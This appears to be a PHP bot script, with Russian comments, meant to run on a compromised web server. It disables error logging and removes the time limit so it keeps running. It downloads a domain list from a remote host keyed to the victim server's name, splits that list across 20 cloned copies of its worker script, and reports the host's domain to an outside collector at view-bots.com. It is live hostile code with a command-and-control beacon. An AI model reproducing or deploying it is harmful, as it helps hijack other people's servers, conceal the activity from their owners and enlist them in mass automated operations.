<?php
ignore_user_abort(true);
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function getURL($url, $maxRedirs = 5, $timeout = 30)
{
    $ch = curl_init();
    $header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    $header[] = "Connection: keep-alive";
    $header[] = "Keep-Alive: 300";
    $header[] = "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3";
    $header[] = "Pragma: "; 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0");
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header); 
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    $content = curl_exec($ch);
    $response = curl_getinfo($ch);
    curl_close ($ch);
    if (($response['http_code'] == 301 OR $response['http_code'] == 302) AND $maxRedirs)
        if ($headers = get_headers($response['url'])) 
            foreach($headers as $value)
                if (substr( strtolower($value), 0, 9 ) == "location:") {
                    $locationURL = trim(substr($value, 9, strlen($value)));
                    if (!preg_match('/^http/', $locationURL)) {
                        $arUrl = parse_url($url);
                        $locationURL = $arUrl['scheme'] . '://' . $arUrl['host'] . $locationURL;
                    }
                    return getURL($locationURL, --$maxRedirs, $timeout);
                }
    return ($content) ? $content : false;
}
function read_file($file_name) 	// $file_name - имя текст дока, который надо прочитать. $arr_name - имя массива, в который надо сохранить.
{
	$list = dirname(__FILE__)."/"."$file_name";
	if (file_exists("$file_name") and (filesize("$file_name")>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

$client = $_SERVER['SERVER_NAME'];

$arr_server_name = read_file('server_name.txt');		// Формируем URL, по которому находится текст док с доменами.
$server_name = trim($arr_server_name[0]);
$server_name = $server_name.$client.".txt";

if (!copy($server_name, "domains.txt")) 
{
	$arch = file_get_contents($server_name);
	if (($arch !== "") and ($arch !== " ") and ($arch !== null))
	{
		$f = fopen ("domains.txt", "w");
		fwrite($f, $arch);
		fclose($f);
	}
	else
	{
		$ch = curl_init($server_name);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
						  
		$data = curl_exec($ch);
		curl_close($ch);
						  
		file_put_contents("domains.txt", $data);
	}
}

if (file_exists('domains.txt'))
{
	$arr_all_domains = read_file('domains.txt');
	
	$count_all_domains = count($arr_all_domains);		// Подсчитываем общее кол-во доменов для чека.
	$for_each = $count_all_domains/20;

	$arr_all_domains = array_chunk($arr_all_domains, $for_each);	// кол-во доменов на каждый поток.
		
	for ($c = 0; ($c < 20); $c++)						// Разбиваем текст. док с доменами на 20 равных частей.
	{
		$file_name = ($c+1);
		$file_name .= '.txt';
		$fnew = fopen("$file_name", "w");
		for ($o = 0; ($o <= $for_each); $o++)
		{
			fwrite($fnew, $arr_all_domains[$c][$o]);
			fwrite($fnew, "\n");
		}
		fclose($fnew);
	}
	
	$file = '1.php';									// Клонируем исполнительный скрипт в 20-ти экземплярах.
	for ($i = 2; ($i <= 20); $i++) 
	{
		$newfile = "$i.php";
		copy($file, $newfile);
	}
	echo "~Main script has been cloned!~";
	
	$domain_name = $_SERVER['SERVER_NAME'];
	$url = 'http://view-bots.com/reciever.php?got='.$domain_name;
	$UA = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)';
	
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);		
	curl_setopt($ch, CURLOPT_TIMEOUT, 9);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
	curl_setopt($ch, CURLOPT_REFERER, $domain_name);
	curl_setopt($ch, CURLOPT_USERAGENT, $UA);
	
	$data = curl_exec($ch);
	curl_close($ch);
	
	echo $data.'<hr>';
	
	$data = file_get_contents($url);
	echo $data.'<hr>';
	
	echo getURL($url);

}
else
{
	echo "ERROR!";
}
?>